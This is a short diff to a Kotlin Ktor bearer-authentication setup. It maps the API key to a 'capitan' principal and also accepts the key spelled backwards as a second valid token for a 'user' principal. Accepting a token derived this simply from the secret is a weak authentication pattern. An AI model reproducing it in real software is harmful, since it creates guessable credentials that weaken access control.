@@ -7,10 +7,10 @@ fun Application.auth(apiKey: String) {
     install(Authentication) {
         bearer("auth-bearer") {
             authenticate { tokenCredential ->
-                if (tokenCredential.token == apiKey) {
-                    UserIdPrincipal("user")
-                } else {
-                    null
+                when (tokenCredential.token) {
+                    apiKey -> UserIdPrincipal("capitan")
+                    apiKey.reversed() -> UserIdPrincipal("user")
+                    else -> null
                 }
             }
         }
